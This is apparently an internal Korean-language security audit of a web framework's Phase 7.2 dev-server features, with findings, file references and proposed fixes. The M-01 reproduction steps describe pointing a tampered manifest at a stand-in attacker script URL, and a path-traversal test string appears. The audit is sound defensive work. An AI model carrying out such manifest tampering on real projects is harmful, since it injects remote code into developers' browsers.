---
title: "Phase 7.2 — 보안 감사 보고서 (R3 최종 게이트)"
status: audit-complete
audience: Mandu core team + release review
scope:
  - Rounds R1/R2 구현 전수 (2026-04-19 ~ 2026-04-20)
  - SPEED (B5 live + Tier 2 vendor cache + CLI bench) + COMPLETENESS (HDR + Playwright) + HARDENING (CSP nonce + manifest schema + URL caps + slot regex)
last_commit_audited: bfdca8d
previous_audit: docs/security/phase-7-1-audit.md
related:
  - docs/bun/phase-7-2-team-plan.md
  - docs/bun/phase-7-2-benchmarks.md
  - docs/security/phase-7-1-audit.md
  - docs/security/phase-7-audit.md
created: 2026-04-20
---

# Phase 7.2 — 보안 감사 보고서

Phase 7.2.R1 (`28c861e` SPEED + COMPLETENESS + HARDENING) + R2 (`bfdca8d` cold/warm 재판정 + B5 live E2E + HDR DOM preservation) 에 대한 merge-gate 감사. 감사 범위는 팀 플랜 §4 Agent E 의 10 개 focus 항목 전부 + Phase 7.1.R3 가 Phase 7.2 로 미룬 Medium/Low 4 건이 실제로 닫혔는지 재검증.

**결론: Critical 0 / High 0 / Medium 2 / Low 4 / Info 4 건. Critical/High 없음 — Phase 7.2 는 Fast Refresh + HDR 2 개의 새 공격면을 도입했지만 양쪽 모두 방어 체인이 단일 방어 이상으로 구성되어 있고, Phase 7.1 M-01 (CSP nonce) 은 완전히 닫혔다. 다만 Phase 7.1 M-02 (manifest schema 검증) 는 구현은 되었으나 production 경로에서 호출되지 않아 실효성 없음 → M-02 재진입 (본 보고서 M-02). Medium 2 건 모두 merge 를 block 하지 않으며 Phase 7.3 follow-up 권장.**

---

## 1. 감사 요약

| 심각도 | 카운트 | 상태 |
|---|---|---|
| Critical | **0** | — |
| High | **0** | — |
| Medium | 2 | TODO (Phase 7.3) |
| Low | 4 | TODO / 문서화 |
| Info | 4 | 문서화 |

### 이전 Round 결과 재검증

| ID | 항목 | Phase 7.2 상태 |
|---|---|---|
| 7.1 M-01 | Fast Refresh preamble CSP nonce | ✅ **닫힘** — `ssr.ts:238-255` + `streaming-ssr.ts:523-537` 에 nonce 주입 + `MANDU_CSP_NONCE=0` opt-out + `Content-Security-Policy: script-src 'self' 'nonce-<n>' 'strict-dynamic'` 헤더 emit. 128-bit 엔트로피, per-render 생성, WeakMap 으로 response 헤더에 전달. |
| 7.1 M-02 | manifest `shared.fastRefresh` URL 검증 | ⚠️ **부분 닫힘** — `manifest-schema.ts` Zod 검증 + `isSafeManduUrl` 구현됐으나 **production 경로에서 호출되지 않음** (테스트만 사용). 본 보고서 **M-01** 로 재진입. |
| 7.1 L-01 | `acceptFile` URL size + unsafe chars cap | ✅ **닫힘** — `fast-refresh-plugin.ts:127-154` `validateAcceptFileUrl()` + 2 KB cap + 6 개 unsafe 시퀀스 거부. 실 production 경로 `appendBoundary` 에서 호출됨. |
| 7.1 L-02 | `$RefreshReg$` / `$RefreshSig$` prod smoke | ✅ **닫힘** — `prod-smoke.test.ts` 가 prod 번들에서 dev-only symbol 누출 없음 assertion. |
| 7.1 L-03 | `slotModule` path regex | ✅ **닫힘** — `dev.ts:477-507` 에서 `SLOT_PATH_REGEX = /^(?:spec\/slots|app)\/[A-Za-z0-9_\-./\[\]]+\.slots?\.tsx?$/` + `..` / 절대경로 / 백슬래시 / Windows 드라이브 거부 + `startsWith(rootDir + sep)` 이중 방어. |

### 감사 범위 표

| # | 영역 | 파일 / 라인 | 결과 |
|---|---|---|---|
| 1 | HDR `X-Mandu-HDR: 1` 헤더가 외부 origin 에서 주입 가능한가 | `runtime/server.ts:2210-2228` | ✅ 통과 — CORS 기본 `false` + 커스텀 헤더 preflight 필요 → cross-origin 불가 |
| 2 | `?_data=1` 쿼리로 악의적 fetch 유발 가능성 | `runtime/server.ts:2095, 2203-2230` | ✅ 통과 — 기존 SPA 네비게이션 contract 재사용; HDR 추가로 공격면 증가 없음 |
| 3 | `applyHDRUpdate` 가 수신한 JSON 을 검증 없이 React props 로 주입 | `client/router.ts:642-675` | ⚠️ **L-01** (loader JSON 은 동일 origin 이라 원래 신뢰 영역; 추가 검증 권고만) |
| 4 | `mandu:slot-refetch` WS 메시지가 악의적 hostname 으로 fetch 유도할 수 있나 | `runtime/ssr.ts:638-641`, `streaming-ssr.ts:762-765` | ✅ 통과 — fetch URL 은 `window.location.pathname + window.location.search + '_data=1'` 로 고정; 외부 host 주입 불가 |
| 5 | `MANDU_HDR=0` 서버 + 클라이언트 양쪽 유효 | `cli/commands/dev.ts:421` + `runtime/ssr.ts:630` | ⚠️ **I-01** — 서버측 유효 (broadcast skip), 클라이언트측 `window.__MANDU_HDR_DISABLED__` 는 읽기만 되고 어디서도 설정 안 됨 → 이중 방어 미완성 |
| 6 | Vendor cache SHA-256 tamper 검증 | `bundler/vendor-cache.ts:177-210` | ✅ 통과 — size + 전체 read + SHA-256 재계산; 불일치 시 miss |
| 7 | Vendor cache manifest tamper (hash 필드 조작) | `bundler/vendor-cache.ts:177-210` | ✅ 통과 — size 먼저 검사 + hash 는 actual 파일 SHA-256 vs manifest.hash; manifest 조작만으로는 우회 불가 (실 파일도 매치시켜야 함) |
| 8 | Vendor cache key 에 Bun/React 버전 포함 | `bundler/vendor-cache.ts:491-509` | ✅ 통과 — 5 개 필드 (Bun + react + react-dom + react-refresh + @mandujs/core) 전수 비교 |
| 9 | `MANDU_VENDOR_CACHE=0` opt-out | `bundler/build.ts:1364` | ✅ 통과 — `cacheEnabled = isDev && process.env.MANDU_VENDOR_CACHE !== "0"` |
| 10 | Vendor cache restore 후 TOCTOU 공격 | `bundler/vendor-cache.ts:333-361` | ℹ️ **I-02** — restore 시 재해시 안 함; 이론상 TOCTOU 가능하나 공격 전제 filesystem write 필요 = 이미 게임 오버 |
| 11 | CSP nonce 엔트로피 (16 bytes = 128 bit) | `runtime/ssr.ts:308-316` | ✅ 통과 — `crypto.getRandomValues(new Uint8Array(16))` + base64 |
| 12 | CSP nonce per-render 생성 (재사용 X) | `runtime/ssr.ts:478-483`, `streaming-ssr.ts:528-535` | ✅ 통과 — `OPTIONS_TO_NONCE = new WeakMap<object, string>()` 호출 시마다 생성 |
| 13 | CSP 헤더 실제 response 에 emit | `runtime/ssr.ts:754-763`, `789-798` | ✅ 통과 — `renderSSR` / `renderWithHydration` 모두 `_testOnly_getAttachedCspNonce(options)` 로 ferry + `extraHeaders` 로 결합 |
| 14 | `MANDU_CSP_NONCE=0` byte-identical 동작 | `runtime/ssr.ts:285-286, 758-762` | ✅ 통과 — env 가 `"0"` 이면 nonce `undefined`, extra 미emit |
| 15 | HTML nonce 와 헤더 nonce mismatch 가능성 | `runtime/ssr.ts:478-486, 759`, `streaming-ssr.ts:528-535, 896-900` | ✅ 통과 — 동일 `resolvedCspNonce` 변수를 HTML 주입 + WeakMap ferry 양쪽에 공유 |
| 16 | Zod `strict()` 가 unknown key 거부 | `bundler/manifest-schema.ts:218-228` | ✅ 통과 — 테스트 B6 `evilField` 추가 시 throw |
| 17 | `isSafeManduUrl` regex 우회 (`/\.mandu/client/../etc/passwd`) | `bundler/manifest-schema.ts:128-136, 79-94` | ✅ 통과 — `FORBIDDEN_URL_SUBSTRINGS` 에 `".."` 포함 + regex `[A-Za-z0-9_./-]+` 로 `..` 자체 매치 안 함 |
| 18 | Manifest validation production 경로 wire-up | `ssr.ts:243-246`, `streaming-ssr.ts:525-527`, `build.ts:1772, 1854, 1894` | 🟡 **M-01** — `isSafeManduUrl` / `validateBundleManifest` 가 production 경로에서 **전혀 호출되지 않음**. 7.1.M-02 의 진짜 방어가 여전히 누락 |
| 19 | `validateBundleManifest` throw 시 민감정보 누출 | `bundler/manifest-schema.ts:258-276` | ✅ 통과 — issue path + message 만 노출; stack 미포함 |
| 20 | B5 live cache — 파일 해시 기반 pre-image 공격 | `cli/util/handlers.ts:85-87, 211-212` + B5 구현 | ✅ 통과 — 공격자가 이미 소스 파일 write 권한 필요; 해시 충돌보다 훨씬 싼 공격이 존재하여 이 벡터 자체는 가치 없음 |
| 21 | `ssr:bundled-import` marker 가 민감정보 노출 | `perf/hmr-markers.ts`, `scripts/b5-live-bench.ts` | ℹ️ **I-03** — marker 는 label + ms 만 출력; 민감정보 없음 |
| 22 | Slot path regex Unicode normalization / NFC/NFKC 공격 | `bundler/dev.ts:477-507` | ✅ 통과 — regex `[A-Za-z0-9_\-./\[\]]` 는 ASCII only; Unicode codepoint 통째로 거부 |
| 23 | Slot path Windows `\\` handling | `bundler/dev.ts:486` | ✅ 통과 — `raw.includes("\\")` 거부; 또한 `raw.startsWith("/")` / `/^[A-Za-z]:/` 절대경로 거부 |
| 24 | Slot path symlink 우회 | `bundler/dev.ts:491-494` | ✅ 통과 — `path.resolve` + `startsWith(rootDir + sep)` 로 canonical 화; symlink target 이 rootDir 밖이면 거부 (단, fs 수준에서 이미 follow 됐을 가능성은 별도 대응 필요) |
| 25 | Playwright config credential 노출 | `demo/auth-starter/tests/e2e/playwright-fast-refresh.config.ts` | ✅ 통과 — config 파일에 credential 없음; spec 파일이 ephemeral port + spawn 사용 |
| 26 | CLI bench script input validation | `scripts/cli-bench.ts:177-190` | ℹ️ **I-04** — `FIXTURE_DIR` env 가 spawn `cwd:` + `path.join` 에만 사용; shell injection 없음 |
| 27 | bench JSON artifact credential/path 누설 | `scripts/b5-live-bench.ts:486-527`, `docs/bun/phase-7-2-*-results.json` | ✅ 통과 — port + ms 값만 저장; 파일 경로는 relative fixture 기준 |
| 28 | HDR replay buffer 정보 누출 (slotPath) | `bundler/dev.ts:546-554` | ⚠️ **L-02** — HDRPayload 의 `slotPath` 가 **절대 filesystem 경로** 로 broadcast; localhost WS 외부 유출 없음이지만 project layout 정보 노출 |
| 29 | HDR 재연결 client 가 stale HDRPayload 수신 시 loader call 유도 | `bundler/dev.ts:1733-1738`, `dev.ts:2101-2117` | ✅ 통과 — client 가 `currentId !== routeId` 체크 + 404 → full reload; stale payload 무해 |
| 30 | `MANDU_HDR` / `MANDU_VENDOR_CACHE` / `MANDU_CSP_NONCE` env 로깅 | `cli/commands/dev.ts:421`, `core/bundler/build.ts:1364`, `runtime/ssr.ts:285` | ✅ 통과 — 서버 로그에 env 값 직접 노출 없음; `console.log` 에 env 전체를 dump 하는 경로 없음 |
| 31 | HDR client hook `window.__MANDU_ROUTER_REVALIDATE__` hijacking | `client/router.ts:694-698` | ⚠️ **L-03** — XSS 전제 필요; prod 에도 router 초기화 시 설치되지만 HMR client 자체가 dev-only 라 exploit 경로 없음 |
| 32 | HDR `startTransition` fallback 시 tearing | `client/router.ts:666-674` | ℹ️ **I-04 (추가)** — defensive try/catch 로 fallback 보장; 기능 결함 아님 |

---

## 2. Medium 발견 상세

### M-01 — Manifest schema validation 구현은 완료됐으나 production 경로에서 미호출

**심각도**: Medium (Phase 7.1 M-02 의 실질적 미해결 — merge block 아님, 공격 전제는 여전히 filesystem write)
**상태**: 구현 완료 / wire-up 미완성
**파일**:
- `packages/core/src/bundler/manifest-schema.ts:128-136` (`isSafeManduUrl`)
- `packages/core/src/bundler/manifest-schema.ts:256-277` (`validateBundleManifest`)
- `packages/core/src/runtime/ssr.ts:237-255` (`generateFastRefreshPreambleTag` — 미호출)
- `packages/core/src/runtime/streaming-ssr.ts:523-537` (`generateHTMLShell` — 미호출)
- `packages/core/src/bundler/build.ts:1772, 1854, 1894` (manifest JSON.parse — 미호출)

**CWE**: [CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html), [CWE-829 Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
**OWASP**: A03:2021 — Injection (supply-chain)

#### 영향

Phase 7.2 H2 Agent C 가 `manifest-schema.ts` 에 완전한 Zod 검증 + `isSafeManduUrl` 을 구현했고 테스트 26개가 전부 통과한다. 그러나 `grep -r "validateBundleManifest\|safeValidateBundleManifest\|isSafeManduUrl"` 실행 결과:

```
packages\core\src\bundler\manifest-schema.ts        (구현)
packages\core\src\bundler\__tests__\manifest-schema.test.ts (테스트)
```

production 경로에서 호출되는 곳이 **하나도 없다**:

- `ssr.ts:243-246` — `const fr = manifest?.shared?.fastRefresh; if (!fr) return ""; if (!fr.glue || !fr.runtime) return ""; const raw = generateFastRefreshPreamble(fr.glue, fr.runtime);` → `fr.glue` / `fr.runtime` URL 은 검증 없이 `generateFastRefreshPreamble` 로 전달됨.
- `streaming-ssr.ts:525-527` — 동일 패턴.
- `build.ts:1772, 1854, 1894` — `JSON.parse(manifestRaw) as BundleManifest` cast 만 존재, Zod 검증 없음.

결과: 7.1 M-02 에서 지적한 **`.mandu/manifest.json` 을 공격자가 수정해 `shared.fastRefresh.glue` 를 `https://evil.example.com/steal.js` 로 바꾸면 SSR 이 이를 그대로 HTML inline preamble 의 `import()` URL 로 주입**하는 공격이 여전히 가능하다. `JSON.stringify(glueUrl).split("</").join('<"+"/')` 이중 escape 는 XSS 는 막지만 cross-origin dynamic import 는 **브라우저가 허용**하므로 의미 없음.

#### 재현 단계

1. `mandu dev` 실행 중인 프로젝트에서 .mandu/manifest.json 확보.
2. 공격자 (filesystem write 권한) 가 `shared.fastRefresh.glue` 를 `https://evil.example.com/steal.js` 로 변경.
3. 개발자 브라우저 리로드 → inline preamble 의 `import("https://evil.example.com/steal.js")` 가 실행 → 전면 RCE (브라우저 컨텍스트).

#### 공격 전제 (Medium 등급 유지 사유)

- **filesystem write 권한 필요**: project 소스를 직접 수정할 수도 있는 수준의 전제. "이미 게임 오버" 라서 Critical/High 승격 안 함.
- Phase 7.1 감사에서 이미 Medium 으로 스코어 — 본 Round 에서 그대로 유지.
- 방어 체계가 여전히 **inline preamble 의 `JSON.stringify` + `split("</")` escape** 한 겹 뿐. Phase 7.2 가 약속했던 두 번째 방어 (schema 검증) 가 **wire-up 되지 않음**.

#### 권장 조치 (Phase 7.3 최우선)

**방안 A (최소 침습, 권장)** — `generateFastRefreshPreambleTag` 에 URL 검증 추가:

```ts
// packages/core/src/runtime/ssr.ts:237
import { isSafeManduUrl } from "../bundler/manifest-schema";

function generateFastRefreshPreambleTag(
  isDev: boolean,
  manifest: BundleManifest | undefined,
  nonce?: string,
): string {
  if (!isDev) return "";
  const fr = manifest?.shared?.fastRefresh;
  if (!fr) return "";
  if (!fr.glue || !fr.runtime) return "";
  // M-01 fix: reject manifests whose fastRefresh URLs don't match our
  // strict shape — tampered manifests are our stealth vector.
  if (!isSafeManduUrl(fr.glue) || !isSafeManduUrl(fr.runtime)) {
    console.warn(
      "[Mandu Fast Refresh] manifest.shared.fastRefresh URLs rejected by safety predicate; preamble skipped",
    );
    return "";
  }
  const raw = generateFastRefreshPreamble(fr.glue, fr.runtime);
  // ... (기존 nonce 로직)
}
```

동일 패치를 `streaming-ssr.ts:525-537` 에도 적용.

**방안 B (포괄적)** — `build.ts` 의 manifest 읽기 3 곳 (`1772`, `1854`, `1894`) 에 `safeValidateBundleManifest` 적용:

```ts
// build.ts:1769-1775
const manifestRaw = await fs.readFile(manifestPath, "utf-8");
const validated = safeValidateBundleManifest(JSON.parse(manifestRaw));
if (!validated.ok) {
  console.warn(
    `[Mandu] .mandu/manifest.json schema validation failed (${validated.issues.length} issues); rebuilding from scratch`,
  );
  // fall through to full build
} else {
  existing = validated.manifest;
}
```

**판단**: 본 감사에서는 방안 A 만 **선택적 staging** 으로 제안. 실제 wire-up 은 Phase 7.3 에서 진행. 이유:
1. Phase 7.2 R2 benchmark 와 테스트가 현재 통과 상태 — merge 하고 이후 focused patch 가 깨끗.
2. 방안 A 는 일부 E2E 시나리오에서 가짜 positive 를 만들 수 있음 (예: 미래 bundler 가 `?t=<ts>` 캐시-버스트를 manifest URL 에 직접 포함할 경우). 방안 B 의 전체 validation 과 함께 묶어서 적용하는 편이 안정적.

#### 관련 CWE / OWASP

- [CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-829 Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
- OWASP A03:2021 — Injection (간접)

---

### M-02 — vendor cache 파일이 tamper 없이도 악성 JS 를 서빙할 수 있는 이론적 경로

**심각도**: Medium (공격 전제 과중 — 본질적으로 M-01 과 동등한 filesystem write 전제)
**상태**: 부분 방어 (SHA-256 검증) / 경로 자체 존재
**파일**: `packages/core/src/bundler/vendor-cache.ts:333-361` (`restoreVendorCache`), `packages/core/src/bundler/build.ts:1372-1417` (vendor cache hit branch)
**CWE**: [CWE-367 Time-of-check Time-of-use (TOCTOU) Race](https://cwe.mitre.org/data/definitions/367.html)

#### 영향

`readVendorCache` 는 manifest 검증 + size + SHA-256 을 전부 확인한다 — 이 부분은 설계 우수. 그러나 `restoreVendorCache` 는 같은 파일을 한 번 더 read 하고 outDir 에 복사할 때 **재해시하지 않는다**:

```ts
// vendor-cache.ts:347-358
for (const [logicalId, entry] of Object.entries(manifest.entries)) {
  const src = path.join(cacheDir, entry.path);
  const dst = path.join(outDir, path.basename(entry.path));
  try {
    const buf = await fs.readFile(src);
    await fs.writeFile(dst, buf);   // 검증 없음
    result.set(logicalId, dst);
  } catch {
    return null;
  }
}
```

`readVendorCache` 와 `restoreVendorCache` 사이 (통상 수 ms) 에 공격자가 `.mandu/vendor-cache/_react.js` 를 악성으로 교체하면, hit 판정된 후 restore 단계에서 악성 파일이 `.mandu/client/_react.js` 로 복사된다. 이 파일은 SSR 이 HTML 에 주입하는 `modulepreload` + `script type="module"` 대상이라 즉시 브라우저 실행.

#### 공격 전제 (Medium 등급)

- `.mandu/vendor-cache/` 에 write 권한 필요 → **filesystem write** = M-01 과 동일 전제.
- TOCTOU 윈도우 ~ 수 ms (readVendorCache read-all → restoreVendorCache re-read).
- 공격자가 윈도우 내에 정확히 파일 교체 성공해야 함 → 실제 성공 난이도 높지만 이론적으로 가능.

#### 권장 조치 (Phase 7.3 선택)

```ts
// vendor-cache.ts:restoreVendorCache — 간단한 재검증 추가
for (const [logicalId, entry] of Object.entries(manifest.entries)) {
  const src = path.join(cacheDir, entry.path);
  const buf = await fs.readFile(src);
  // 이중 방어 — readVendorCache 에서 이미 검증됐지만 TOCTOU 윈도우 차단
  if (buf.byteLength !== entry.size || sha256(buf) !== entry.hash) {
    return null;  // 변조 감지 → 전체 rebuild
  }
  await fs.writeFile(dst, buf);
}
```

비용: 추가 해시 계산 1 회 (수 KB 파일 × 6~7 shim = 수십 ms 미만). 성능 영향 무시 가능.

#### 관련 CWE / OWASP

- [CWE-367 TOCTOU Race](https://cwe.mitre.org/data/definitions/367.html)
- [CWE-345 Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- OWASP A03:2021 — Injection (filesystem supply-chain)

---

## 3. Low 발견 상세

### L-01 — `applyHDRUpdate` 가 loader JSON 을 schema 검증 없이 React props 주입

**심각도**: Low (동일 origin 응답 = 기존 신뢰 영역)
**파일**: `packages/core/src/client/router.ts:642-675`
**CWE**: [CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

`applyHDRUpdate(routeId, loaderData)` 가 `loaderData` 의 shape 을 검증하지 않고 `setRouterStateInternal({ loaderData, ... })` 로 바로 주입. HMR client 의 fetch 는 동일 origin (`window.location.pathname + '?_data=1'`) 이라 원래 server 가 정상 응답을 보내면 문제 없지만, **server 가 BC (backward-compat) 중간에 schema 가 바뀐 상태** 거나 **캐시된 오래된 응답이 간섭** 하면 React 가 `undefined.x` 같은 runtime 에러로 터질 수 있다.

**공격 전제**: 공격자가 브라우저 MitM 을 할 수 있으면 이미 게임 오버. 실질 공격 가치 거의 없음.

**권장 (Phase 7.3 선택)**: `payload.loaderData` 가 object 타입인지 / null 인지 최소 체크 추가. startTransition 내부에서 throw 되면 React 가 fallback 에 맡기므로 치명적이진 않음.

### L-02 — HDRPayload `slotPath` 가 절대 filesystem 경로로 broadcast

**심각도**: Low (localhost WS 외부 유출 없음 + Phase 7.0.S Origin allowlist 방어)
**파일**: `packages/cli/src/commands/dev.ts:551` (broadcast 호출), `packages/core/src/bundler/hmr-types.ts:83`
**CWE**: [CWE-209 Information Exposure Through an Error Message](https://cwe.mitre.org/data/definitions/209.html) (변형)

```ts
// cli/commands/dev.ts:546-554
hmrServer!.broadcastVite({
  type: "custom",
  event: "mandu:slot-refetch",
  data: {
    routeId: slotRouteId,
    slotPath: filePath,     // ← 절대 경로 (예: C:\Users\alice\secret-project\app\dashboard\page.slot.ts)
    timestamp: Date.now(),
  },
});
```

`slotPath` 는 client 측 HMR script 의 `console.log` 에 그대로 출력된다 (`ssr.ts:633`, `streaming-ssr.ts:757`). localhost 한정 WS broadcast 라 외부 유출은 없지만, 개발자가 public screenshare / OBS 등을 사용할 때 dev console 에 절대경로가 보일 수 있다 (I-01 phase 7.1 과 동일 카테고리).

**권장 조치 (Phase 7.3 선택)**: broadcast 시 `path.relative(rootDir, filePath)` 로 축약:

```ts
slotPath: path.relative(rootDir, filePath),
```

### L-03 — `window.__MANDU_ROUTER_REVALIDATE__` 전역 훅이 prod 에도 설치됨

**심각도**: Low (XSS 전제 필요 — 이미 게임 오버; prod 에서 HMR script 없으므로 실제 호출 경로 없음)
**파일**: `packages/core/src/client/router.ts:694-698`

```ts
// Phase 7.2 — expose HDR revalidate hook. Only in dev does the HMR
// client script call this; prod builds omit the script.
(window as unknown as {
  __MANDU_ROUTER_REVALIDATE__?: (routeId: string, loaderData: unknown) => void;
}).__MANDU_ROUTER_REVALIDATE__ = applyHDRUpdate;
```

주석에는 "prod 빌드에는 스크립트가 없다" 고 하지만, **전역 훅 설치 자체는 prod/dev 공통**이다. prod 에서도 `window.__MANDU_ROUTER_REVALIDATE__` 은 정의되어 있어 악성 XSS 가 이를 호출해 routerState 를 임의 변경할 수 있다 — 다만 공격자는 이미 XSS 를 달성한 상태라 실질 가치 없음.

**권장 조치 (Phase 7.3 선택)**:

```ts
// Only install in dev
if (process.env.NODE_ENV !== "production") {
  (window as ...).__MANDU_ROUTER_REVALIDATE__ = applyHDRUpdate;
}
```

혹은 `Object.defineProperty` 로 non-writable / non-configurable 설치.

### L-04 — `X-Mandu-HDR: 1` 헤더가 prod 에서도 echo-back

**심각도**: Low (echo-only, 공격 자체는 없음)
**파일**: `packages/core/src/runtime/server.ts:2210-2227`

```ts
const isHDR = req.headers.get("x-mandu-hdr") === "1";
// ...
if (isHDR) {
  headers.set("X-Mandu-HDR", "1");
}
```

prod 에서도 클라이언트가 `X-Mandu-HDR: 1` 을 보내면 서버가 echo 한다. 이 자체는 공격면 아니지만, **prod 에서 HDR 경로는 존재 의미 없음** (slot 개발 시점 기능). prod 에서 이 헤더를 보내는 정당한 클라이언트가 없으므로 조용히 무시하는 편이 principle-of-least-surprise.

**권장 조치 (Phase 7.3 선택)**: `if (settings.isDev && isHDR)` 로 조건 추가.

---

## 4. Info / 기타

| ID | 제목 | 파일 / 라인 | 비고 |
|---|---|---|---|
| I-01 | `window.__MANDU_HDR_DISABLED__` 는 읽기만 되고 설정 경로 없음 | `runtime/ssr.ts:630`, `streaming-ssr.ts:754`, `bundler/dev.ts:2085` | opt-out 은 서버측 `MANDU_HDR=0` (broadcast skip) 로만 동작. 클라이언트 방어막 누락이지만 서버측 기능적 equivalent 존재. Phase 7.3 에서 bootScript 에 `window.__MANDU_HDR_DISABLED__ = ${String(!HDR_ENABLED)};` 주입 권장. |
| I-02 | Vendor cache TOCTOU 재해시 미구현 | `bundler/vendor-cache.ts:347-358` | M-02 참조. 서로 다른 심각도 — I-02 는 "경로 자체 개선 권고", M-02 는 Phase 7.3 Medium. |
| I-03 | `ssr:bundled-import` perf marker 에 민감정보 없음 확인 | `perf/hmr-markers.ts`, `bundler/safe-build.ts` | label + ms 만 — PASS. 별도 조치 불필요. |
| I-04 | CLI bench / B5 bench scripts shell injection 방어 확인 | `scripts/cli-bench.ts:177-190`, `scripts/b5-live-bench.ts:246-259` | `spawn(bun, [...], { shell: process.platform === "win32" })` 의 shell true 는 Windows 한정. 인자는 array 로 전달되어 Windows shell 에서도 quoting 이 안전. PASS. |

---

## 5. 방어 심층 (Defense-in-depth) 재확인

Phase 7.0.S 의 HMR 보안 패치 + Phase 7.1 의 Fast Refresh 보호가 Phase 7.2 코드에도 유지되는지:

| 패치 | 위치 | Phase 7.2 상태 |
|---|---|---|
| C-01 Origin allowlist | `dev.ts:1470-1487` (7.2 커밋 후 line 드리프트 있음) | ✅ 유지 — allowedOrigins 체크 온전 |
| C-02 invalidate rate limit | `dev.ts:1553-1578` | ✅ 유지 — WeakMap counter 그대로 |
| C-03 localhost binding | `dev.ts:1461` | ✅ 유지 |
| C-04 /restart origin reuse | `dev.ts:1490-1512` | ✅ 유지 |
| 7.1 B-3 preamble `JSON.stringify + split("</")` 이중 escape | `dev.ts:1827-1828` | ✅ 유지 — `const glueLit = JSON.stringify(glueUrl).split("</").join('<"+"/');` 그대로 |
| 7.1 B-4 `appendBoundary` idempotency | `fast-refresh-plugin.ts:81, 178` | ✅ 유지 + H3 추가 (URL cap) |
| 7.2 H3 `validateAcceptFileUrl` 실제 적용 | `fast-refresh-plugin.ts:182-190` | ✅ 신규 — `appendBoundary` 내부 wire-up 완료 |
| 7.2 H4 prod smoke test | `__tests__/prod-smoke.test.ts` | ✅ 신규 — prod 번들에 `$RefreshReg$` / `$RefreshSig$` / `__MANDU_HMR__` 누출 없음 |

Phase 7.0.S + 7.1 방어막은 Phase 7.2 R1/R2 개발 중 훼손되지 않았다. 3 에이전트 (A/B/C) 가 `dev.ts` 를 동시 편집하면서도 기존 보안 블록을 보존한 것이 확인됨.

---

## 6. HDR (Hot Data Revalidation) 공격 모델 — 상세 분석

Phase 7.2 는 HDR 이라는 완전히 새로운 dev-time 기능을 추가했다. 이는 `.slot.ts` 편집 시 UI 를 remount 하지 않고 loader 데이터만 refetch 하는 Remix-style 기법. 다음 표는 각 공격 벡터에 대한 평가:

| 시나리오 | 공격 | 방어 | 판정 |
|---|---|---|---|
| 외부 악성사이트가 `X-Mandu-HDR: 1` 으로 fetch | cross-origin fetch 로 loader JSON 탈취 | 기본 CORS `false` + 커스텀 헤더 preflight 필요 → 브라우저가 차단 | ✅ 안전 |
| 악의적 WS 메시지 스푸핑 (`mandu:slot-refetch`) | 임의 URL 로 `fetch()` 유도 | client 가 `window.location.pathname + '_data=1'` 로 고정; routeId 만 payload 에서 받아 matching | ✅ 안전 |
| `?_data=1` 으로 민감 loader 데이터 크롤링 | loader JSON exposure | 기존 SPA 네비게이션 contract; 원래부터 `_data=1` 은 loader 반환 값을 JSON 으로 공개. HDR 가 새 공격면 추가 아님 | ✅ 변화 없음 |
| HDRPayload slotPath 로 fs 정보 누출 | 절대 경로 broadcast | localhost WS + Phase 7.0.S Origin 체크; 외부 유출 없음 | ⚠️ L-02 (screenshare 시 console 노출) |
| React startTransition 내부에서 tearing | 정합성 파괴 | client/router.ts defensive try/catch fallback | ✅ 방어 완비 |
| MANDU_HDR=0 bypass | opt-out 무효화 | 서버 broadcast skip (유효) + 클라 window flag (미구현) | ⚠️ I-01 (이중 방어 미완성) |

**결론**: HDR 은 네트워크 측면 새 공격면 **없음**. 공격 표면은 dev-only 이며 Phase 7.0.S 의 Origin allowlist 가 여전히 관문. 정보 누출 L-02 와 opt-out 이중방어 I-01 은 follow-up 사안.

---

## 7. 벤치마크 / E2E 스크립트 감사

| 스크립트 | 감사 | 결과 |
|---|---|---|
| `scripts/cli-bench.ts` | `Bun.spawn` / `child_process.spawn` 를 호출. env / argv 처리 안전성. | `spawn("bun", ["run", CLI_ENTRY, "dev", "--port", String(port)], ...)` — 배열 형태 args 라 shell injection 없음. `FIXTURE_DIR` env 는 `cwd` + `path.join` 에만. Windows `shell: true` 는 array args 에 대해 Bun/Node 가 자동 quote. ✅ PASS. |
| `scripts/b5-live-bench.ts` | 같은 패턴 + 파일 write (`writeFileSync(abs, nextContent)`). | `abs = path.join(FIXTURE_DIR, cat.file)` 이고 `cat.file` 은 CATEGORIES 상수에서 하드코딩 (`"app/page.tsx"` 등). 공격 가능한 동적 입력 없음. `restoreInitialContent` 로 테스트 후 복원. ✅ PASS. |
| `demo/auth-starter/tests/e2e/playwright-fast-refresh.config.ts` | credential 누출 / 보안 설정. | config 자체에 credential 없음. `outputFolder: "../../.mandu/reports/..."` 는 gitignored. `trace/video/screenshot` 은 CI 에서만 활성화. ✅ PASS. |
| `demo/auth-starter/tests/e2e/fast-refresh.spec.ts` | 파일 변조 → 복원, dev server spawn. | `LAYOUT_SLOT = path.join(DEMO_ROOT, "app", "layout.slot.ts")` 하드코딩. `pickFreePort()` 로 ephemeral. `afterEach` 에서 backup 복원. ✅ PASS. |
| `docs/bun/phase-7-2-*-results.json` artifacts | 민감정보 / 절대경로 확인. | `port`, `readyMs`, marker summary 만 저장. absolute 경로는 `fixture: FIXTURE_DIR` 에 사용자 홈 포함될 수 있지만 `docs/bun/` 은 저자가 커밋 의도로 생성. 배포 아티팩트 아님. ℹ️ 개발 산출물 성격상 PASS. |

---

## 8. Phase 7.3 로 미루는 항목 (권장 순위)

| # | 항목 | 우선순위 | 출처 |
|---|---|---|---|
| 1 | **M-01 manifest schema wire-up** — `ssr.ts`/`streaming-ssr.ts`/`build.ts` 3 곳에 `isSafeManduUrl` / `safeValidateBundleManifest` 호출 추가 | 🔴 최우선 | Phase 7.1 M-02 재진입 |
| 2 | **M-02 vendor cache TOCTOU 재검증** — `restoreVendorCache` 에서 re-hash 추가 | 🟡 권장 | Phase 7.2 R3 신규 |
| 3 | **L-01 `applyHDRUpdate` loader schema 최소 검증** — payload.loaderData 타입 체크 | 🟢 선택 | Phase 7.2 R3 신규 |
| 4 | **L-02 `slotPath` 상대경로화** — `path.relative(rootDir, filePath)` broadcast | 🟢 선택 | Phase 7.2 R3 신규 (I-01 phase 7.1 확장) |
